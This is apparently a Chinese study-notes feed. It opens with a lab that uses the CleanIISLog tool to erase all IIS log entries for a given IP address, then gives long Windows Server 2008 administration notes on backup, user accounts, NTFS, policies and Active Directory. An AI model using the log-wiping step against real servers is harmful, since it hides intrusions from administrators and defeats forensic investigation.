手动删除IIS日志文件（1）测试CleanIISLog软件能否正常运行点击桌面-课程-工具，找到CleanIISLog软件所在目录下，按住shift并右键鼠标，选择“在此处打开命令窗口”。 输入“CleanIISLog”命令，若运行正常，则会给出一些帮助信息，如图所示，否则会提示错误信息。 使用CleanIISLog.exe清除IIS日志该工具可以清除某个特定IP地址产生的日志文件，使用以下命令：CleanIISLog C:\WINDOWS\system32\LogFiles\日志文件 IP地址执行成功后，会提示修改了多少处。在这里，我们输入C:\WINDOWS\system32\LogFiles\W3SVC2\ u_ex170829.log 为需要清除的日志文件，127.0.0.1为要清除的ip地址， 再次打开日志文件 u_ex170829.log ，从中可以发现该日志中无127.0.0.1的ip地址信息. 实验思考/练习尝试其他CleanIISLog工具的功能。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows server 2008基础内容]]></title>
    <url>%2F2019%2F08%2F10%2Fwindows-server-2008%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[第一章计算机的组装与维护本章结构一、计算机的硬件概述二、BIOS的设置三、常见故障排查 四、组装计算机（动手） 具体知识点一、 概述1、 计算机的工作原理：冯诺.伊曼提出。由输入设备、存储器、运算器、控制器、输出设备五大部件组成2、 硬件的主要参数​ 机箱:物理保护,保护硬件安全.集成电源(升级硬件的时候,注意电源是否供足)​ cpu风扇:风冷扇热和水冷扇热​ 光驱:已不流行.(作用:读取和写入光盘数据)​ 键盘鼠标:接口(ps2和usb)​ 显示器:(lcd crt) （1）、CPU(中央处理器)：负责运算与控制核心数：内核，CPU中所有的运算、接受、存储命令都由核心执行主频：表示CPU的运算速度，单位GHz，主频越高、CPU的运算速度越快缓存：CPU和内存之间的临时存储器、容量小、速度快CPU读取数据的顺序：先一级缓存、再二级缓存，然后三级缓存、最后内存两大主流厂商：Intel 和AMD接口类型:AMD针脚式 inter触点式 （2）、主板：各部件的连接载体（接口类型和数量决定计算机的性能、扩展升级的能力）组成命名：芯片组 RJ45接口：网卡的接口 RJ-11PATA（IDE）、SATA：硬盘接口、光驱（家用计算机） SCsi：硬盘接口（高档工作站、服务器、价格昂贵、支持热插拔）(sata IDE scsi)PCI、PCI-E:显卡的接口CPU的接口：LGA1633（触点式）、Socket（针脚式）DIMM：内存插槽南桥芯片:负责键盘鼠标显示器usb北桥芯片:负责重要硬件(cpu 内存 硬盘 显卡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869（3）、内存：负责临时存储CPU运算所需的数据（断电后数据丢失）容量：容量越大越好主频:标志着单位时间内内存的交换速度(频率)三通道技术：使用三条同等规格的内存(同主频同品牌同型号)DDR3：第三代内存（4）、显卡：负责将计算机的运算结果转换为影像芯片厂商：NViDIA和AMD显存：临时存储需要转换为图像的数据（容量越大越好） 显存频率：显卡工作的频率（越高速度越快）显存位宽：瞬间传输数据的流量（位数越大，传输越多）GTX1040 970（5）、硬盘：外部存储器（断电后数据不会丢失）分类:机械硬盘和固态硬盘 接口类型:sata(主流笔记本硬盘接口) IDE(光驱使用此接口,硬盘的IDE淘汰) SCSI(用户服务器) 品牌:希捷 西部数据 三星 容量：越大越好 转速：越快传输数据速度越快 5400 7200 10000固态硬盘：芯片阵列组成、无盘片：读写速度快、散热低、无噪音###### （6）、驱动程序：硬件厂商根据操作系统编写的配置文件#### 二、 BIOS的设置1、概念：基本的输入输出系统的简称，存储在计算机主板的Flash ROM(cmos芯片)中2、功能：存储计算机基本的硬件信息3、启动过程:A、加电自检：通电后自动检测硬件的连接情况，如果异常发出报警音B、初始化：读取硬件参数并存储C、引导操作系统：按照设定的顺序、将系统装入内存4、CMOS芯片 存储bios程序#### 常见设置User Password ：只能查看COMS的设置，可以更改自己的密码Supervisor Password ：可以修改（设置后保证了BIOS的安全）4）、忘记密码的解决方法将主板上的电池断电或者用芯片附近的跳线-----------------------------------------------------------------------------------------------------------------------------------------------------------## Vmware Workstation##### 本章结构一、虚拟机的概述二、虚拟机的使用##### 具体知识点###### 一、概述###### （一）、虚拟机的定义是一款软件，能实现模拟计算机硬件的功能，能给其他的应用程序提供一个独立的运行环境###### （二）、虚拟机的运行架构（两种）1、寄居架构：虚拟机软件需要安装在有操作系统的计算机上。本机称为宿主机，安装在虚拟机的系统称为客户机2、原生架构：虚拟机不需要依赖其他操作系统，自己本身就是一款系统直接安装在硬件之上3、各公司对应的产品 Vmware Workstation 寄居架构1）、Vmware公司 VmwarevSphere原生架构 Virtual PC和Virtual Server 寄居架构 122、微软 Hyper—V 原生架构``` 3、思杰公司XenDesktop XenServer原生架构 二、虚拟机操作应用1、安装2、新建虚拟机3、常用的快捷键a、从虚拟机切换到宿主机（本机） Ctrl +Altb、虚拟机全屏显示 Ctrl + Alt + Enterc、重启 Ctrl + Alt + Insert = Ctrl + Alt + Deleted、从宿主机进入虚拟机 Ctrl + G 4、管理虚拟机a、迁移虚拟机（把安装好的虚拟机系统复制到其他机器上直接使用）b、安装Vmware Tools（增强虚拟机的硬件功能，使虚拟机能够使用真实机打印机和文件夹等功能，实现直接拖拽文件）c、快照（将虚拟机的系统做个备份，当出现问题时，能将系统快速的恢复到稳定状态）d、克隆：（能快速的创建多个虚拟机系统）链接克隆：引用源虚拟机的一个当前状态，源虚拟机损坏，当前的虚拟机也会损坏（占用空间小） 完整克隆：创建了一个完整的副本，该虚拟机状态是完全的独立的（占用空间大） vmnet0:桥接到真实网卡（真实电脑）vmnet1(独立网络，相当于交换机) 安装操作系统Windows 7的安装 （一）、安装条件1、CPU的主频 32位系统 1GHz 64位系统 1.4GHz2、内存 32位系统 1G 64位系统 2G 3、系统盘容量32位系统 16G 64位系统 20G （二）、安装方式1、全新安装安装后是该计算机上唯一的系统，不会保留系统分区2、升级安装只能由Windows Vista 版本升级到Windows 73、双引导安装装两个系统，注意：先安装低版本，再安装高版本 注意事项：USB3.0 数据的理论传输速度达到5GB/s ，是USB2.0的10倍 一.Windows Server Backup使用注意事项：​ 需要一个单独的专用磁盘运行计划备份​ 只能备份本地磁盘上 NTFS 格式的卷​ 不能备份到磁带​ 不能恢复由 Ntbackup.exe 创建的备份 二、添加Windows Server Backup功能​ 图形化界面工具​ 命令行工具 三、备份方式：​ 1.一次性备份​ 2.备份计划​ 周期性进行​ 减小工作量 四、备份类型：​ 1.整个服务器备份​ 2.自定义备份 五、备份方式设置：​ 1.始终执行完整备份​ 所选数据全部备份​ 耗时较长​ 2.始终执行增量备份​ 只备份新添加或有改动的数据​ 备份速度快​ 降低系统整体性能损耗​ 3.自定义备份设置​ 针对不同磁盘选择不同的备份方式 六、一次性备份（控制台备份和命令行备份）1.一次性备份（命令行） wbadmin start backup -backuptarget :f: -include:d: ----将D盘的数据备份到F盘 2.一次性还原（命令行还原） get versions -----查看备份 wbadmin start recovery -version:10/09/2018-02:14 -itemtype:file -items:e:\aa.txt -recoverytarget:e:\-----将E盘的指定文件aa.txt恢复到E; wbadmin start recovery -version:10/09/2018-02:14 -itemtype:volume -items:e: -----将整个e盘的数据恢复到e盘 -itemtype: -----还原对象类型 对象类型包括三个：APP（程序） FILE（文件） VOLUME（卷）七、计划备份​ 1.控制台计划备份​ 2.计划任务备份​ 1.创建命令执行脚本（.bat）​ wbadmin start backup -backuptarget:f: -include:e: -quiet​ 2.创建计划任务触发脚本​ 开始—-管理工具—-任务计划工具（触发器、操作） 第三章 Windows 的用户管理本章结构一、用户管理二、组的管理具体知识点 一、用户的管理（一）、SID1、定义：每个用户账户拥有唯一的安全标识符，用来记录用户的权限2、组成： Windows ID + 用户的相对ID组成 Windows ID ：在安装Windows 的过程每台计算机都会产生不同的Windows ID相对ID： 500 是Administrator 账户的相对ID ；新建的第一个用户是1000，第二个是1001，依次类推。 （二）、创建账户（三）、账户的分类1、与使用者相关联的账户1）、Administrator 默认管理员账户 （使用者中权限最高）2）、Guest 账户 访客使用 （默认禁用） 2、与Windows 组件关联的账户1）、SYSTEM 本地系统账户；为Windows 核心组件访问文件提供权限 （拥有高于Administrator的权限）2）、Local Service （本地服务） 为一部分服务提供访问系统权限 ；权限和Users一致3）、Network Service （网络服务） 二、组的管理作用：一些账户的集合，为“组”设置权限后，隶属于该组的账户默认具有这些权限，方便管理 （一）、需要人为添加成员的组1、Administrators 组 默认管理员组 （可以将账户加入改组让用户具有管理员权限）2、Guests 默认来宾组3、Power Users Windows Server 2008上为向下兼容保留的组 （不再使用）4、Users 新用户的默认组 （二）、动态包含成员的组1、INTERACTIVE 默认包含在本地登录的账户2、Authenticated Users 包含了通过验证的所有账户3、Everyone 所有账户 （设置开放权限时使用） 命令配置用户命令创建用户Net uer 用户名 密码 /add例如：net user zhangsan 123.com /add —–创建用户zhangsan密码为123.com 命令删除用户Net user 用户名 /del例如：net user zhangsan /del ——-删除zhangsan用户命令重置用户密码Net user 用户名 “”例如：net user zhangsan “” —–将zhangsan用户密码重置位空查看用户Net user将用户假如指定组Net localgroup 组名 用户名 /add例如：net localgroup administrator zhangsan /add—将zhangsanj加入administrator管理组命令配置组命令创建组Net localgroup 组名 /addNet localgroup jishubu /add —–创建jishubu组命令删除组Net localgroup jishubu /del命令添加用户到指定组Net localgroup 组名 用户名 /add例如：net localgroup administrator zhangsan /add—将zhangsanj加入administrator管理组 文件服务本章结构一、共享文件夹二、文件服务器及其策略具体知识点 一、共享文件夹（一）、定义：将存储在计算机上的文件夹及其中文件通过网络提供给其他计算机上操作的人。（二）、访问共享文件夹1、UNC路径 ： \对方的IP地址（主机名）\共享名 （需要输入对方电脑上的一个用户及密码）2、创建共享的用户： 只能是Administrators组成员3、隐藏共享：在创建共享夹时共享名后加”$”访问方式：\服务器主机名或IP地址\共享名4、默认共享：Windows 默认创建分区的共享，访问这些默认共享需要administrator账户身份 二、文件服务器（一）、两种网络结构1、对等网：所有的机器都需要创建相同的用户名和密码；实现彼此访问共享文件夹缺点：不适合大型网络，共享文件夹分散2、C/S结构：网络中提供文件资源的集中存储和访问，实现：集中化管理、内容控制、高可靠性、便捷的搜索服务。 （二）、文件服务器的角色服务1、共享和存储管理 为共享文件夹和存储资源提供简化管理2、分布式文件系统（ DF S）：两种技术：D F S命名空间和D F S复制技术DFS 命名空间可以使用户从一个入口访问位于多台计算机上的共享资源3、文件服务器资源管理器 ：实现文件夹和卷的配额，主动屏蔽文件4、网络文件系统服务（NF S）：实现Windows 和Unix 混合环境的文件共享解决方案5、Windows 搜索服务：是Windows Server 2008上一种新型索引解决方案 （三）、服务器的策略管理1、拒绝从网络访问 （可以实现某些特殊用户通过网络访问服务器）2、本地账户的共享安全模型 （实现强制网络访问者以来宾身份访问文件服务器）注意：文件服务器上要启用来宾账户3、使用空白密码的本地账户只允许进行控制台登录 （实现服务器中没有设置密码的账户不被冒用，针对administrator账户）禁用 选项 说明administrator 账户不能登录（空密码）启用选项 说明administrator 账户能登录 （空密码）4、密码保护共享 （启用，要求文件服务器和客户端必须拥有相同的用户名和密码才能访问） （四）、共享权限1、网络访问 共享权限和NTFS权限的交集 （拒绝权限大于一切）2、本地访问 只看NTF S权限（唯一生效NTFS权限） NTFS权限本章结构一、理解NTFS权限二、掌握NTFS权限的设置方法具体知识点 一、NTFS权限（一）、文件系统1、定义：在外部的存储设备上（硬盘）管理组织存储文件的一种方法—–存储设备（U盘 硬盘 移动硬盘）没有文件系统是无法存储数据的，相当于电脑没有操作系统无法操作。2、常见的文件系统 ：FAT 简单文件存储（FAT 16 、FAT32，无安全性） NTFS 新型文件传输系统（有安全性） EXT （EXT3 ，EXT4 Linux系统下）3、权限：理解一种权利，只有拥有权限才能对文件进行修改、删除、等操作 （二）、NTFS文件系统的新功能1、访问控制列表 （限定用户和组对文件或文件夹具有如何操作权限）2、加密文件系统3、压缩4、磁盘配额 限定用户最大使用磁盘空间，保证磁盘的高效利用二、权限的设置及规则1、权限不冲突时累加 用户同时属于多个组，如果权限不冲突，该用户拥有所有组权限之和2、权限冲突时，拒绝优先3、默认继承权限 文件夹的权限默认会被其子文件夹和子文件继承1）阻止继承（在子文件夹和文件上操作）2）强制生效（父级文件夹上操作） a、读取权限 读取访问控制列表的权限4、特别的权限 b、更改权限 更改访问控制列表的权限（建立在读取权限基础上） c、取得所有权 默认情况下文件的创建者就 是其所有者，拥有完全控制权限 本地安全策略本章结构一、账户策略的配置二、本地策略的配置具体知识点 账户策略的配置（一）、本地安全策略的定义：影响当前计算机的安全设置，用户登录后会受安全策略的控制（二）、打开本地安全策略管理控制台：1、图形化： 开始\控制面板\系统和安全\管理工具\本地安全策略2、命令：secpol.msc （三）、账户策略1、作用：通过设置密码策略和账户锁定策略来提高用户的密码安全级别2、包含：密码策略和账户锁定策略 （四）、密码策略1、密码复杂性要求 （包含4类字符中的三种）2、密码长度最小值 （如果设为0代表可不设置密码；最大为14）3、密码最短使用期限 （0998之间；设置为0 代表可随时更改密码）（对Administrator不生效）4、密码最长使用期限 （0999天之间，默认42天，代表一个密码用42天后必须更改密码；设置为0代表密码永不过期）5、强制密码历史 （代表最近使用的几次密码不可以被使用；范围0~24；0代表可随意使用过去使用的密码）6、用可还原的加密存储密码 （一种密码的加密方式，默认设置为禁用，更安全） （五）、账户锁定策略1、账户锁定阈值 （代表用户连续输错 密码次数等于阈值后该账户被锁定；范围0999；设置为0代表该账户永不锁定）2、账户锁定时间 （代表该账户被锁定后，多长时间自动解锁；范围099999分钟；设置为代表永远被锁定，只能由管理员手动解锁）3、重置账户锁定计数器 （用户在该计数器时间内只要输错次数不到锁定阈值，该账户不被锁定，过此时间后又有相同的输错次数；设置范围小于或等于账户锁定时间）注意：账户锁定策略对管理员账户完全不生效 二、本地策略（一）、三部分内容1、审核策略 2、用户权限分配 3、安全选项 （二）、审核策略作用：确定是否将计算机与安全有关的事件记录到安全日志中，也可将用户成功或者失败的登录记录在日志中等事件查看器：用于浏览和管理事件日志 （三）、用户权限分配作用：可以对某些特定的用户和组授予或拒绝一些特殊的权限常用设置：关闭系统更改系统时间拒绝本地登录拒绝从网络访问这台计算机允许通过远程桌面服务登陆 （三）、安全选项作用：控制一些和操作系统安全相关的设置常用设置：交互式登陆-登陆时不显示用户名交互式登陆-试图登陆的用户的消息标题交互式登陆-试图登陆的用户的消息文本网络访问-本地账户的共享和安全模型账户-使用空白密码的账户只允许控制台登陆 注意：更新策略的命令 ： gpupdate （四）、本地组策略 （一组策略的集合，在工作组环境没有在域环境应用广泛）打开管理控制台的命令： gpedit.msc Windows 磁盘管理本章结构一、磁盘管理概述二、Windows 动态磁盘管理具体知识点 一、磁盘管理概述（一）、分区方式1、MBR 分区方式 ：主启动记录；包含引导程序和分区表（64字节）；每个分区信息会占16个字节；最多可划分4个主分区；注意：如果想划分超过4个分区，第四个主分区会变成扩展分区，然后在扩展分区上再去划分逻辑分区2、GPT的分区方式：分区表突破64字节；Windows 2008上最多可划分128个主分区 （二）、基本磁盘1、只能管理连续的磁盘空间2、不能提高读写效率3、无可靠性 （三）、动态磁盘1、可扩展性 （随时扩展文件系统的管理空间，即分区的容量）2、高读写性 （动态磁盘中卷由多个硬盘组成，提高读写的速率）3、高可靠性 （防止某个硬盘损坏导致数据丢失） 二、Windows 动态磁盘卷管理（一）、联机 只有联机硬盘才能初始化使用（二）、初始化 选择两种分区方式的一种（三）、新建卷的过程 （首先需要把基本磁盘转换为动态磁盘） 1、简单卷 （条件：如果存一个比较大的文件放不下 跨区） 2、跨区卷 （至少2块硬盘，写满一个再写下一块硬盘，无法提高效率 带区） 3、带区卷 （数据会同时往N个硬盘上写，速率最快，但不能容错 镜像） 4、镜像卷 （能实现容错，但损失磁盘利用率，不能提升读写速率 RAID-5卷）5、RAID卷 （既能容错、也能提高读写速率） 总结：卷类型 需要磁盘数 每个磁盘提供的空间是否一致 可扩展性 读写性能 容错 空间利用率简单卷 1 —— 可 正常 无 100%跨区卷 232 不一致 可 正常 无 100%带区卷 232 一致 否 最快 无 100%镜像卷 只能是2个 一致 否 正常 有 50%RAID-5卷 3~32 一致 否 较快 有 n-1 （四）、管理卷1、扩展性 （在简单卷和跨区卷上实现，只要不是系统盘就可扩展，如果跨到其他硬盘简单卷会变成跨区卷）2、压缩卷3、添加镜像 （简单卷添加镜像会变成镜像卷）4、删除镜像 （镜像卷删除镜像后会变成简单卷）5、中断镜像 （镜像卷会变成两个简单卷）6、RAID-5卷 （最多只能损坏一块硬盘，可通过修复卷修复该RAID-5卷） 部署DHCP服务FTP服务本章结构一、FTP的客户端二、FTP服务器 具体知识点一、FTP客户端（一）、FTP定义是一种应用层协议，称文件传输协议，主要能实现用户的上传和下载功能；采用C/S结构进行管理 （二）、常见的FTP客户端1、WWW浏览器访问 （最常用）2、命令行工具具体操作方法：a、登录FTP服务器 命令提示符 输入 ： ftp FTP服务器的IP地址b、输入用户名 直接输入 （提示信息：以数字2或3的百位数说明登录成功；以5开头的百位数代表登录失败）c、输入密码 （不显示密码）d、显示文件列表 l s （简单显示） 或 dir （详细显示）e、进入文件夹 c d 文件夹名f、 后退一步 cd . .g、下载文件 get 文件名 （默认所在的下载位置是当前登录账户所在的文件夹内）h、上传文件 put 文件名 （默认要把需要 上传的文件放在当前登录账户的文件夹内）i、删除文件 del 文件名j、退出登录 bye3、专用图形工具FileZilla ； CuteFTP ； FlashFXP； LeapFTP 二、FTP服务器（一）、在Windows Server2008上搭建FTP服务器1、需要在角色中/添加角色/Web服务器（IIS）/添加必须的功能/勾选上FTP服务/安装2、启动FTP站点 （默认生成一个站点（可删也可保留）默认主目录：C:\inetpub\ftproot）3、权限：用户的访问权限是NTFS权限和FTP权限的交集4、匿名账户：anonymous 和 ftp （二）、Serv-U定义：是一款软件，可以将任何计算机变成FTP服务器 （三）、常见的FTP服务端Xlight ftp Server ； RaidenFTPD ； EFT Server ；FileZilla Server 部署web服务部署DNS服务IISWWW服务www(word wide web)—万维网服务，其实现形式是通过web站点。 搭建WEB服务的软件： 1.Apache(开源软件，多应用于Linux、Unix系统下) 2.IIS（微软产品，多应用于Windows系统下） IIS7.5与老版本对比的技术改进： \1. 集成扩展 2.管理功能增强 3.应用程序宿主增强 4.对服务器核心版本的.net功能增强 WEB站点的安装（详细步骤见课本P62-63） 安装之后，在浏览器输入localhost来验证IIS是否正常工作 localhost=127.0.0.1 WEB站点的配置1.配置站点的IP和端口号 @IP地址建议使用静态地址 @端口号默认是80 可以更改端口号，更改后访问格式如下：http://ip:新端口号 @类型：http&amp;https(安全版http，加密传输的网页数据) 2.配置站点的物理路径和连接限制 @默认站点的物理路径：c:\inetpub\wwwroot(注意：出于安全考虑，此路径不要与系统在同一个分区) @连接限制分为三种设置： ​ *链接超时：默认120秒（120S之后将重新访问） ​ *最大并发连接数：最大可承载的访问数（防止系统超负荷过重） ​ *最大带宽：限制站点使用的网络带宽，防止web服务占用过多的网络资源，影响其他网络服务。 3.默认文档 服务搭建成功后在没有指定要访问网页时，用于默认想用用户的文档网页 系统已设默认文档如下：Default.htm Default.asp ,index.html,iisstart.htm 优先显示顺序：至上而下（顺序可调整） 虚拟目录一、概念：逻辑上网站数据（文件夹或网页）在网站站点，物理上网站数据在其他主机或是路径，防止主目录 占用空间过大，导致空间不足。 二、虚拟目录优点：1.将数据分散保存到不同的磁盘或是主机，便于开发维护 2.数据移动到其他位置时，不会影响到weB站点的逻辑结构 3.虚拟目录的物理路径即可是本地路径也可以是远程共享文件夹 三、创建虚拟目录—四、配置虚拟目录​ @可以修改物理路径，但是不能修改虚拟主机别名 ​ @可以设置默认文档 虚拟主机—-一台服务器上运行多个网站，这些网站成为虚拟主机 一、实现虚拟主机的方式：​ 1.使用不同的IP ​ 2.使用相同的IP的不同的端口号 ​ 3.使用相同的IP和端口号，不同的主机名 Windows Server 2008R2 的安装与网络配置本章结构一、Windows Server 2008R2的版本及安装二、基本配置 具体知识点一、Windows Server 2008的版本及安装（一）、Windows Server 2008R2 的改进特点：集成了更多的功能、更多的网络服务组件（新技术：Hyper-V 、Server Core 、IIS 7.0等） （二）、家族成员版本 支持CPU 内存 环境标准版（Standard） 4个CPU 32位：4GB64位：32GB 中小企业企业版（Enterprise） 8个CPU 32位：64GB64位：2TB 大型企业数据中心版（Datacenter） 32位：32个CPU64位：64个CPU 32位：64GB64位：2TB 超大规模企业Web 版 4个CPU 32位：4GB64位：32GB 为Web应用程序服务器安腾版 64个CPU 2TB 基于Itanium计算机，不支持虚拟化 （三）、安装企业版最低的硬件要求1、CPU速度 32位：1GHz 64位：1.4GHz2、内存 512MB3、硬盘空间 最少10GB （四）、安装方式1、完全安装 （传统安装模式，安装完成后可充当各种服务器角色）2、服务器核心安装 （不安装完整的图形用户界面，减少了受攻击面和硬件资源损耗） 二、基本配置（一）、给接口配置IP地址1、打开命令提示符： 输入： netsh interface show interface （查看接口名称）2、配置动态获取IP地址： netsh interface ip set address “接口名称” DHCP3、配置静态IP地址： netsh interface ip set address “接口名称” static IP地址 子网掩码 默认网关 （二）、自动专用IP地址定义：当网络中不存在DHCP服务器或DHCP服务器宕机的情况下，如果选择自动获取IP地址，会得到169.254.0.0~169.254.255.255 这个网段的地址备用配置：该备用配置中的用户配置优先级高于自动专用IP地址 （三）、配置DNS服务器地址1、静态的： netsh interface ip set dnsserver “接口名称” static DNS地址2、动态的： netsh interface ip set dnsserver “接口名称” DHCP （四）、计算机名特点：网络上必须唯一，即使位于不同的工作组，也不能同名，尽量不要以数字开头，重启后才会生效命令： netdom renamecomputer localhost（127.0.0.1） /newname ：” 新计算机名” （五）、工作组定义：是微软设计的一种网络模型，默认情况下所有机器都属于Workgroup工作组环境；该环境下所有机器地位平等 部署Windows 域环境本章结构一、域、活动目录的相关概念二、部署Windows 域环境三、管理域中的账户、组、OU 具体知识点一、域、活动目录的相关概念（一）、工作组特点：工作组环境下的计算机地位平等，规模很小（不适合大型企业网络环境） （二）、域环境定义：逻辑上把网络中计算机组织在一起，集中管理的一种网络环境优点：1、集中管理 2、便捷的网络资源访问 3、可扩展性 是一个数据库：存储着整个Windows网络中用户、组、计算机、共享文件夹 活动目录等对象信息是一种服务：能实现对数据对象的增、删、改、查等操作 域就是活动目录具体的体现形式 域控制器（DC）：安装了活动目录功能的计算机 域环境成员计算机：加入了该域环境的计算机 （三）、域的结构单域：网络中只有一个域 （最常见的管理方式）域树：具有连续名称空间的多个域域林：由一个或多个没有形成连续名称的域树组成 二、部署Windows 域环境（一）、部署域控制器必须满足条件： 1、安装者必须是本地管理员权限 2、操作系统版本必须是服务器版本（Web版除外） 3、本地至少一个分区是NTFS文件系统 4、配置静态的IP地址和子网掩码 （正确TCP/IP设置） 5、磁盘空间足够输入安装命令： dcpromo （二）、部署成员计算机1、客户机必须和域控制器是连通的2、一定要配置正确的DNS地址 （否则无法解析域名，也就无法加入域） 三、域中用户、组 、OU的管理（一）、用户1、命名规则：a、唯一的用户登录名 （登录名在域中是唯一的；显示名在OU中唯一）b、最长20字符c、不能出现非法字符 （ &lt; &gt; ? ! / \ | = 等） 2、用户属性a、登录时间 ： 来限制用户登录域的时间b、登录到：可实现账户可以登录的客户机范围c、账户过期：规定用户账户是否存在过期的期限来保证账户安全 （二）、组 安全组：主要是用于设置用户安全权限的组的类型 通讯组：主要用于电子邮件通信的 本地域组：使用范围是本域 组的作用域 全局组：使用范围是整个林及信任域 通用组：使用范围是整个林及信任域 （用户的登录或查询速度更快） （三）、OU的管理定义：是活动目录中的一个容器（组织单位）；可以存放用户、组、计算机、OU等其他对象创建方法：基于部门的；基于地理位置的；基于对象类型的特别注意：OU中不能包含来自其他域中的对象 域控管理本章结构一、回顾Windows 域二、添加额外域控及管理三、卸载域控 具体知识点一、回顾Windows 域1、域环境的概念2、域环境的搭建a、安装域控制器的条件 b、客户机加入域的条件 c、用户、组、OU的管理 二、添加额外域控及管理（一）、为什么要有额外域控？1、容错 当域中的域控制器出现故障时，其他域控仍能提供域服务2、负载均衡 适用大型网络环境，加快用户登录域的审核速度3、更易于用户的连接访问 适用于分支机构，提高登录速度 （二）、安装额外域控的条件1、必须具有域管理员身份2、正确的TCP/IP设置 （能保证和域控制通信，DNS设置正确）3、操作系统版本必须受当前域功能级别支持 （向下兼容）安装过程使用命令：dcpromo （在现有林，添加域控制器）注意：安装过程中不需要加入域也能成功安装完成后，AD中所有数据是同步的 三、卸载域控制器（一）、注意事项1、保证域环境中至少有一台全局编录服务器 （用于验证用户登录）2、所有域控一定要处于联机状态3、如果该域控制器不是域内的最后一台域控制器，则该控制器被降级为成员服务器；如果是最后一台域控制器，则降级为独立服务器 （二）、卸载命令 ： dcpromo 组策略的应用本章结构一、组策略的相关概念二、组策略的应用（修改现有策略、创建、应用规则、软件分发等） 具体知识点一、组策略的相关概念（一）、作用：统一桌面环境、自动执行脚本、安全设置、软件安装等 （二）、好处：1、减小管理成本（只要设置一次就可对相关用户或计算机生效）2、减小用户单独配置错误的可能性3、可以针对特定对象（用户或计算机）实施特定策略 （三）、GPO1、组策略的所有配置信息都存放在GPO中2、GPO只能链接到站点、域、OU中（SDOU），通过设置来影响容器中的计算机或用户3、默认存在的GPO： 默认域策略（Default Domain Policy ）对整个域都生效 默认域控制器策略（ Default Domain Controller Policy） 对域控生效 （四）、组策略的内容1、计算机配置 ： 对容器内的计算机生效 （客户端重启生效）2、用户配置： 对容器内的账户生效 （客户端注销生效） 二、组策略的应用（一）、应用规则1、默认继承 （下级容器会默认继承上级容器的策略）2、阻止继承 （下级容器可以选择阻止继承上级容器的策略）3、强制生效 （上级容器的策略可以强制让下级容器生效） 强制生效 &gt; 阻止继承 &gt; 默认继承4、应用顺序与规则1）、顺序：LSDOU的顺序 （从左到右应用），后应用的生效2）、不冲突 ： 累加3）、冲突： 后应用的生效4）、如果同一个容器应用了多个GPO，不冲突则累加；冲突，谁的优先级高谁后应用，谁生效 （优先级=1 为最高）5、筛选：可以实现阻止一个GPO应用到容器中的特定账户或计算机 6、软件分发1）、准备.msi格式的软件包2）、需要创建共享文件夹，把需要部署的软件放在共享文件夹中，并赋予共享文件夹的共享权限和NTFS权限3）、创建GPO\用户配置\策略\软件设置\软件安装\属性\选择默认程序包的位置4）、添加数据包5）、设置“登录安装此应用程序”6）、验证 分配：可以将程序分配到用户或计算机上 （用户必须用的软件，采用“分配”）发布：可以将程序发布给用户，用户可选择是否安装 注意：分配比发布更具有强制性的部署方式 Windows 备份和灾难恢复本章结构一、Windows 备份工具的概述二、数据备份三、数据还原 具体知识点一、备份工具（一）、备份： 为了避免数据丢失（硬件故障、误操作、病毒感染…..），提前将系统中数据按一定策略存储到安全的地方，当出现问题时能快速还原减少损失 （二）、还原： 备份的反向过程 （三）、Windows Server Backup特性：是Windows Server 2008系统中的一个功能，由管理控制台和命令行工具组成；能实现对服务器执行基本的备份和还原功能。改变：P73~ P74安装：服务器管理器\功能\选择“Windows Server Backup”(安装命令行工具，必须安装Windows Powershell 功能）\下一步安装 二、数据备份（一）、备份方式1、手动备份 （一次性备份）2、自动备份 （备份计划） 周期性进行，减少管理员工作量 （二）、一次性备份的操作1、图形化方式2、命令行方式备份wbadmin （固定格式命令） start backup （开始备份） -backuptarget：盘符： （备份存储目标位置） -include：盘符： （备份的源位置） （三）、一次性备份的恢复1、图形化2、命令行a、查看可用的备份集版本 wbadmin get versions （查出的关键数据是版本标识符）b、开始恢复 wbadmin start recovery （开始恢复） -version：版本标识符 -itemtype：类型 -items：还原内容的具体位置列表（例：D：\aaa.txt） -recoverytarget：盘符：\ （还原的目标位置） 类型：三种 volume 代表卷 app 应用程序 file 文件或文件夹 （四）、计划备份的操作 （准备一块单独硬盘）1、图形化2、命令行a、查看可用的磁盘 wbadmin get disks （查看的关键内容是目标磁盘的磁盘标识符）b、 wbadmin enable backup （启用备份） -addtarget ：磁盘标识符 （备份目标存储位置） -schedule：备份时间 （如果多个时间用逗号隔开） -include：盘符： （需要备份的盘） -allCritical （包含系统分区卷）注意：计划备份必须包含系统分区3、命令行还原 （同一次性还原） （五）、备份配置1、完整备份 每次备份所有内容都会备份 （时间长但不影响性能）2、增量备份 只有改动的内容会被备份，以前备份过的不再备份 （速度快，降低整体性能）3、自定义 可针对不同磁盘选择不同方式 （建议：系统盘完整备份，其他盘做增量备份） 活动目录备份和灾难恢复本章结构一、AD备份/还原二、备份/还原操作三、Windows 的安全模式 具体知识点一、AD备份还原简介（一）、为什么要进行活动目录备份？ （p105）（二）、注意：如果要备份AD，只能当成系统状态的一部分完成​ 系统状态数据包括 ： P105~P106 （三）、备份系统状态的注意事项1、只能用命令完成2、不能自动备份 （如果想实现自动备份，只能通过任务计划完成）3、只能存在本地磁盘4、恢复时只能恢复系统状态数据和应用程序；卷和文件无法恢复5、备份操作者的权限： 只能是Administrators 组和 backup Operators组成员 （四）、两种还原方式及区别1、非授权还原 （域中只有一台DC ；域中有多台DC，但是旧数据不需要还原到其他域控制器上）2、授权还原 （域中有多台DC，数据需要还原到所有DC上；是建立在非授权基础之上） 二、备份\还原操作（一）、单域控备份，非授权还原1、备份 ： wbadmin start systemstatebackup （开始系统状态备份） -backuptarget：目标盘符：2、删除用户和OU及文件夹3、非授权还原a、重启 按 F8 选择目录服务还原模式 ；用“.\administrator”输入安装域控时目录服务还原密码登录b、查看备份集版本 wbadmin get versions （关键版本标识符）c、非授权还原 wbadmin start systemstaterecovery （开始恢复） -version：版本标识符d、还原完成后重启，删除的用户和OU可以恢复，文件夹不能恢复 （二）、多域控，授权还原1、环境 （两台DC，一主，一额 ）2、主域控建立了4个域用户：aa、bb、cc、dd ；aa、bb在user中；cc、dd直接在域中；建立了两个OU aa和bb；在C盘还建立了T218的测试文件夹3、做系统状态备份 （主域控）4、备份完成后，删除刚刚建立的所有内容 （发现误操作）5、先做非授权还原6、授权还原 （需要建立在非授权基础上，非授权完成后不重启）a、Ntdsutil 